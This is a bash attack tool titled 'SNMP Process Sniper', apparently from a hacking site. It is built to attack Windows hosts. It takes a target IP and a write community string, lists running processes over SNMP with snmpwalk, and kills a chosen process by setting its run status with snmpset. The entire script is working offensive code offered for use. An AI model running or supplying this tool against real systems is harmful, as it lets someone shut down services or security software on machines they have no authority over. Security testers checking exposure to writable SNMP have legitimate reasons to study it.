#!/bin/bash

# Author:     Doug contact through HackWhackandSmack.com
# Use:        To Kill Processes through SNMP Write on Windows
# Released:   www.hackwhackandsmack.com
# Tested:     IBM Tivoli SNMP Agent For Windows
version=0.1


echo -e "\e[00;31m####################################################################################################\e[00m"
echo -e "###   					SNMP Process Sniper 		       		        ###"
echo -e "###   \e[00;32m      The program is designed to attack windows by killing processes through SNMP\e[00m 	###"
echo -e "###                                       Version: $version                             		###"
echo -e "\e[00;31m####################################################################################################\e[00m"

#Set Variables

echo -e "\e[00;31mEnter The Target IP Address:\e[00m"
read RHOST

echo -e "\e[00;31mEnter The Write Community String:\e[00m"
read COMMUNITY
 
echo -e "\e[00;31mEnter SNMP Version to use(1/2c):\e[00m"
read VER
clear
DIR="tmp" #temp files

#Create Temp Files
touch "/$DIR/PID"
touch "/$DIR/PROCESS_NAME"
touch "/$DIR/process-list.txt"

#TEST SNMP SETTINGS
Test_SNMP () {
echo "Testing SNMP Settings....."
test=$(snmpwalk -v $VER -c $COMMUNITY $RHOST iso.3.6.1.2.1.25.1.1 | cut -d ' ' -f 3)
if [ "$test" = "Timeticks:" ]
	then  
	echo -e "\e[00;35mSNMP Settings Work!!\e[00m"
	echo "To Start Push Enter:"
	read Start
	clear 	
        else
	echo -e "\e[00;31mSomething is Wrong try again!!\e[00m"
	echo -e "\e[00;31mProgram Exiting\e[00m"
	exit
fi

}

#PROCESS LIST Function
Get_Process () {

echo "-----">/$DIR/PID
echo "PID">>/$DIR/PID
echo "-----">>/$DIR/PID

echo "--------------">/$DIR/PROCESS_NAME
echo "Process_Name" >>/$DIR/PROCESS_NAME
echo "--------------">>/$DIR/PROCESS_NAME

snmpwalk -v $VER -c $COMMUNITY $RHOST iso.3.6.1.2.1.25.4.2.1.2 | cut -d "." -f 12 | awk '{ print $1}'  2>&1 >> /$DIR/PID
snmpwalk -v $VER -c $COMMUNITY $RHOST iso.3.6.1.2.1.25.4.2.1.2 | cut -d "." -f 12 | awk '{ print $4}' | cut -d '"' -f 2 >> /$DIR/PROCESS_NAME  

paste /$DIR/PID /$DIR/PROCESS_NAME  | column -t 2>&1 > "/$DIR/process-list.txt"

#Display List
cat "/$DIR/process-list.txt"
}


#Kill Process Function
Kill_Process () {
echo -e "Enter PID that you would like to \e[00;31mKILL\e[00m"
read PID
clear
snmpset -v $VER -c $COMMUNITY $RHOST .1.3.6.1.2.1.25.4.2.1.7.$PID i 4
echo -e "\e[00;31mKilled \e[00m"$PID
}

showMenu () {
	echo -e "\e[00;34m##################################\e[00m"
	echo -e "###   	SNMP Process Sniper    ###"
	echo -e "\e[00;34m##################################\e[00m"	
	echo -e "1) \e[00;34mRead Process List\e[00m"
	echo -e "2) \e[00;34mKill A Process\e[00m"
	echo -e "3) \e[00;34mQuit\e[00m"
	echo -e "Choose an option:"
}

#Start Program
Test_SNMP
#Run Looped Menu
while [ 1 ]
do
	showMenu
	read CHOICE
	case "$CHOICE" in
		"1")
		clear
		Get_Process
		;;
		"2")
		clear
		Kill_Process
		;;
		"3")
		rm -r "/$DIR/PID"
		rm -r "/$DIR/PROCESS_NAME"
		rm -r "/$DIR/process-list.txt"
		exit
		;;
	esac
done
